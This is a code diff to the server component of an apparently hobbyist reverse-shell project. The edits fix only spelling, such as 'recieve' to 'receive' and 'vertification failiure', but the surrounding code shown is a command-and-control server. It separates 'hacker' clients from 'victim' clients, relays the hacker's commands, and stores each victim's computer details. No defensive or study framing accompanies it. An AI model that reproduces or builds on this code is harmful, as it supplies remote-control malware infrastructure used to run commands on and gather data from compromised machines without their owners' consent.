@@ -5,7 +5,7 @@ import reverse_shell.utils as ut
 import json
 import uuid
 
-SERVER = "0.0.0.0"  # this is a wildcard for binding all adresses available to the host
+SERVER = "0.0.0.0"  # this is a wildcard for binding all addresses available to the host
 ADDR = (SERVER, ct.SERVER_PORT)
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,7 +17,7 @@ all_victims = {}
 
 
 def handle_client(client_sock: socket.socket, client_addr):
-    identification_message = ut.recieve_message(client_sock)
+    identification_message = ut.receive_message(client_sock)
     args = (client_sock, client_addr)
 
     if identification_message == "hacker":
@@ -31,7 +31,7 @@ def handle_client(client_sock: socket.socket, client_addr):
     else:
         ut.send_message(ct.UNVERIFIED_MESSAGE, client_sock)
         # close the connection with the client
-        ut.log("vertification failiure", f"{client_addr} is not a verified client.")
+        ut.log("verification failure", f"{client_addr} is not a verified client.")
         client_sock.close()
 
 
@@ -40,10 +40,10 @@ def handle_hacker(hacker_sock: socket.socket, hacker_addr):
 
     connected = True  # Connected with the hacker
 
-    # recieve commands from the hacker and then execute
+    # receive commands from the hacker and then execute
     # them accordingly
     while connected:
-        message = ut.recieve_message(hacker_sock)
+        message = ut.receive_message(hacker_sock)
         if not message:
             connected = False
             continue
@@ -61,7 +61,7 @@ def handle_victim(victim_sock: socket.socket, victim_addr):
     connected = True  # This means we have connected to the victim
 
     # Get the computer configurations
-    computer_info = ut.recieve_message(victim_sock)
+    computer_info = ut.receive_message(victim_sock)
     if computer_info is not None:
         computer_info = json.loads(computer_info)
 
@@ -72,7 +72,7 @@ def handle_victim(victim_sock: socket.socket, victim_addr):
     all_victims[victim_id] = computer_info
 
     while connected:
-        message = ut.recieve_message(victim_sock)
+        message = ut.receive_message(victim_sock)
         if not message:
             connected = False
             continue
